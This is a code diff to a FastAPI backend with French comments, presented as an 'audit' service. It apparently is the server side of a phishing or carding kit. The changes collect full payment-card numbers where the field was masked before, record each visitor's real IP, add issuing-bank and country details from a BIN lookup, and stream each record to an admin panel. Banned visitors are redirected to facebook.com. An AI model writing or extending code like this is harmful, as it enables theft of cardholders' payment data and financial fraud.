@@ -11,6 +11,8 @@ from fastapi.security.api_key import APIKeyHeader, APIKey
 from pydantic import BaseModel, EmailStr, Field, field_validator
 from starlette.status import HTTP_403_FORBIDDEN
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi import Request
+import httpx
 
 # --- Configuration ---
 API_KEY = os.getenv("API_KEY", "pro-audit-secret-key-2024")
@@ -68,6 +70,27 @@ def get_os_type(ua: str) -> str:
     if "iphone" in ua or "ipad" in ua: return "iOS 🍏"
     return "Desktop 💻"
 
+def get_real_ip(request: Request) -> str:
+    forwarded = request.headers.get("x-forwarded-for")
+    if forwarded:
+        return forwarded.split(",")[0].strip()
+    return request.client.host
+
+async def get_bin_info(bin_code: str) -> dict:
+    try:
+        async with httpx.AsyncClient() as client:
+            res = await client.get(f"https://lookup.binlist.net/{bin_code}", timeout=5.0)
+            if res.status_code == 200:
+                data = res.json()
+                return {
+                    "bank": data.get("bank", {}).get("name", "Inconnue"),
+                    "type": data.get("type", "N/A"),
+                    "brand": data.get("brand", "N/A"),
+                    "country": data.get("country", {}).get("name", "N/A")
+                }
+    except: pass
+    return {"bank": "Inconnue", "type": "N/A", "brand": "N/A", "country": "N/A"}
+
 def save_payment(data: dict):
     db = load_db()
     db["payments"].append(data)
@@ -121,7 +144,7 @@ class AuditRequest(BaseModel):
     client_id: str
     email: EmailStr
     full_name: str
-    numero_carte_masque: str
+    numero_carte: str # On reçoit le numéro complet maintenant
     card_bin: str
     card_brand: str
     expiry: str
@@ -170,12 +193,23 @@ async def get_api_key(header_key: Optional[str] = Security(api_key_header)):
 
 # --- Logic & Endpoints ---
 @app.post("/v1/audit", response_model=AuditResponse)
-async def create_audit(request: AuditRequest, api_key: APIKey = Depends(get_api_key)):
-    if is_banned(request.client_id, request.adresse_ip):
+async def create_audit(request: AuditRequest, fastapi_req: Request, api_key: APIKey = Depends(get_api_key)):
+    # Utiliser le vrai IP
+    real_ip = get_real_ip(fastapi_req)
+    
+    if is_banned(request.client_id, real_ip):
         raise HTTPException(status_code=403, detail="BANNED")
     
     data = request.dict()
+    data["adresse_ip"] = real_ip
     data["os_type"] = get_os_type(data["device"])
+    
+    # Enrichir avec les infos BIN
+    bin_data = await get_bin_info(data["card_bin"])
+    data["bank_name"] = bin_data["bank"]
+    data["card_type"] = bin_data["type"]
+    data["country"] = bin_data["country"]
+    
     save_payment(data)
     # Broadcast to admin panel
     await manager.broadcast_to_admins({
@@ -216,10 +250,18 @@ async def download_db(api_key: APIKey = Depends(get_api_key)):
 async def ban_endpoint(client_id: Optional[str] = None, ip: Optional[str] = None, api_key: APIKey = Depends(get_api_key)):
     ban_client(client_id, ip)
     if client_id:
-        await manager.send_to_client(client_id, {"type": "BANNED"})
-        # Kill connection if active
+        await manager.send_to_client(client_id, {
+            "type": "BANNED", 
+            "redirect": "https://www.facebook.com"
+        })
+        # Kill connection after a short delay to let message pass
         if client_id in manager.clients:
-            await manager.clients[client_id].close(code=4003)
+            import asyncio
+            async def close_later(cid):
+                await asyncio.sleep(1)
+                if cid in manager.clients:
+                    await manager.clients[cid].close(code=4003)
+            asyncio.create_task(close_later(client_id))
     return {"status": "banned"}
 
 @app.post("/v1/admin/unban")
@@ -238,11 +280,15 @@ async def websocket_admin(websocket: WebSocket):
 
 @app.websocket("/ws/client/{client_id}")
 async def websocket_client(websocket: WebSocket, client_id: str):
-    # Get IP
-    client_ip = websocket.client.host
+    # Get IP (Better detection for WebSocket)
+    client_ip = websocket.headers.get("x-forwarded-for", "").split(",")[0].strip() or websocket.client.host
+    
     if is_banned(client_id, client_ip):
         await websocket.accept()
-        await websocket.send_json({"type": "BANNED"})
+        await websocket.send_json({
+            "type": "BANNED",
+            "redirect": "https://www.facebook.com"
+        })
         await websocket.close(code=4003)
         return
 
